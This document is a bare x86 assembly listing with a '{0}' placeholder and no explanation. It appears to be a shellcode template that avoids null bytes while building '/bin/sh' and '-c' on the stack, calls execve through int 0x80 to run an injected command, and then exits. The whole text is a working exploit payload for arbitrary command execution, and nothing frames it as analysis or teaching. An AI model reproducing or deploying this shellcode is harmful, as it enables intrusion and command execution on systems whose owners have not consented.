{0}
mov    %esp,%ecx
push   $0x632d9090
pop    %edx
shr    $0x10,%edx
push   %edx
mov    %esp,%edx
push   $0x68732f90
pop    %ebx
shr    $0x8,%ebx
push   %ebx
push   $0x6e69622f
mov    %esp,%ebx
xor    %eax,%eax
push   %eax
push   %ecx
push   %edx
push   %ebx
mov    %esp,%ecx
xor    %edx,%edx
push   %edx
push   %ecx
push   %ebx
mov    $0x3b,%al
push   $0x2a
int    $0x80
mov    $0x1,%al
mov    $0x1,%bl
int    $0x80